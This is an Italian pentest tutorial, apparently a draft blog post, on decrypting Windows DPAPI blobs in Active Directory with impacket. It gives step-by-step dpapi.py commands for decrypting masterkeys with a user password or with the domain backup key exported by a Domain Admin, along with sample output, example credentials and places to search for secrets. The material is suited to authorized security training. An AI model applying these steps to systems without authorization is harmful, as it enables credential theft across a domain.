---
title: 'DPAPI Attack in Active Directory: Estrarre Password Cifrate e Masterkey'
slug: dpapi
description: 'Come estrarre e decriptare blob DPAPI in Active Directory con impacket. Guida pratica con masterkey, domain backup key e tool.'
image: /dpapi.webp
draft: true
date: 2026-03-17T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - domain-backup-key
  - dpapi
---

DPAPI (Data Protection API) è il meccanismo con cui Windows **cifra password e segreti** di utenti e servizi. In un pentest AD è una fonte di credenziali spesso ignorata — e spesso ricchissima.

In questa guida vediamo cos'è un blob DPAPI, come trovare le masterkey e come decriptare credenziali cifrate con due tecniche diverse: password utente e domain backup key.

***

## Cos'è un blob DPAPI

Un blob DPAPI è una **password cifrata**. Pensa a una scatola chiusa a chiave: dentro c'è la password in chiaro, ma non puoi leggerla senza la chiave giusta.

Si riconosce subito: inizia sempre con `01000000d08c9ddf...`

```
01000000d08c9ddf0115d1118c7a00c04fc297eb...
```

Lo trovi in file di testo, nel registry, in share SMB — spesso lasciato lì da script di automazione o credenziali salvate da applicazioni.

***

## Cos'è una masterkey DPAPI

La masterkey è la **chiave che apre il blob**. Ogni utente ha le sue, salvate qui:

```
C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
```

Dentro trovi uno o più file con GUID lunghi:

```
a06ee801-8caa-441e-ab23-1fbc46887c3a
99eee2f9-080f-407c-96be-3e02f784a7e0
```

Il blob DPAPI contiene al suo interno il GUID della masterkey usata per cifrarlo — basta cercare la corrispondenza tra il GUID nel blob e i file presenti nella cartella.

***

## File speciali nella cartella Protect

| File          | Cosa è                                                   |
| ------------- | -------------------------------------------------------- |
| `<GUID>`      | Masterkey dell'utente                                    |
| `Preferred`   | Punta alla masterkey attiva                              |
| `BK-<DOMAIN>` | Backup della masterkey cifrato con la chiave del dominio |

***

## Tecnica 1 — Decriptare con la password dell'utente

Se hai le credenziali dell'utente, decripti la masterkey direttamente.

**Step 1 — scarica la masterkey**

```bash
download C:\Users\tracy.white\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\a06ee801-8caa-441e-ab23-1fbc46887c3a
```

**Step 2 — decripta la masterkey**

```bash
dpapi.py masterkey \
  -file a06ee801-8caa-441e-ab23-1fbc46887c3a \
  -sid S-1-5-21-914744703-3800712539-3320214069-1113 \
  -password zqwj041FGX
```

Output:

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0x19533c22781bcf9ea604...
```

**Step 3 — converti il blob in binario**

Se il blob è in formato testo hex:

```bash
xxd -r -p blob.txt blob.bin
```

**Step 4 — decripta il blob**

```bash
dpapi.py unprotect \
  -file blob.bin \
  -key 0x19533c22781bcf9ea604...
```

Output:

```
Successfully decrypted data
0000   68 00 48 00 4F 00 5F 00  53 00 39 00 67 00 66 00   h.H.O._.S.9.g.f.
```

La password è in UTF-16LE — ogni carattere ha uno `00` dopo. Leggila saltando i byte nulli: `hHO_S9gff7ehXw`

***

## Tecnica 2 — Domain Backup Key (senza password utente)

Il DC conserva un backup di tutte le masterkey del dominio, cifrato con la sua chiave RSA privata. Chi ottiene questa chiave può decriptare le masterkey di **qualsiasi utente** senza conoscerne la password.

Serve accesso come Domain Admin.

**Step 1 — esporta la domain backup key dal DC**

```bash
dpapi.py backupkeys \
  -t nara-security.com/Administrator:Password1@192.168.1.1 \
  --export
```

Ottieni tre file:

```
G$BCKUPKEY_<GUID>.pvk   ← quello che usi
G$BCKUPKEY_<GUID>.der
G$BCKUPKEY_<GUID>.key
```

Usa solo il `.pvk` — è il formato che legge impacket.

**Step 2 — decripta la masterkey con il pvk**

```bash
dpapi.py masterkey \
  -file a06ee801-8caa-441e-ab23-1fbc46887c3a \
  -sid S-1-5-21-... \
  -pvk 'G$BCKUPKEY_.pvk'
```

Stessa masterkey — senza la password dell'utente.

> **Quando è utile:** hai blob DPAPI di utenti di cui non conosci la password. Con il `.pvk` del dominio decripti le loro masterkey senza bisogno di crackare nulla. È una delle chiavi più preziose che puoi estrarre da un DC.

***

## Dove cercare blob DPAPI durante un pentest AD

```
C:\Users\<utente>\Documents\
C:\Scripts\
Share SMB accessibili
SYSVOL — script GPO
Task Scheduler — file XML dei task
```

Cerca file `.txt`, `.xml`, `.ps1` che contengono la stringa `01000000d08c9ddf`.

***

## Riepilogo

| Hai                  | Metodo                                                     |
| -------------------- | ---------------------------------------------------------- |
| Password dell'utente | `dpapi.py masterkey -password`                             |
| Domain Admin         | `dpapi.py backupkeys --export` → `dpapi.py masterkey -pvk` |

***

## Tool

* [impacket dpapi.py](https://github.com/fortra/impacket) — tutto il flusso da riga di comando
* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — alternativa da eseguire direttamente sul target Windows

***

## Approfondimenti

* [ESC1 — Certificati AD CS con Certipy](https://hackita.it/articoli/adcs-esc1-esc16)
* [Kerberoasting in Active Directory](https://hackita.it/articoli/kerberoasting)
* [BloodHound — Enumerazione AD](https://hackita.it/articoli/bloodhound)

***

## Vuoi andare più in profondità?

Se stai studiando il pentest su Active Directory da solo e ti blocchi, o hai un'azienda o un sito web che vuoi mettere alla prova, HackIta può aiutarti.

**Formazione 1:1** — sessioni pratiche su misura, dal primo accesso alla compromissione del dominio. Niente slide, solo lab reali.
[https://hackita.it/servizi](https://hackita.it/servizi)

**Penetration test** — test offensivo su infrastruttura aziendale o applicazione web, con report dettagliato e remediation.
[https://hackita.it/servizi](https://hackita.it/servizi)

**Supporta il progetto** — se questi articoli ti sono utili e vuoi che continuino ad esistere, considera una donazione.
[https://hackita.it/supporto](https://hackita.it/supporto)
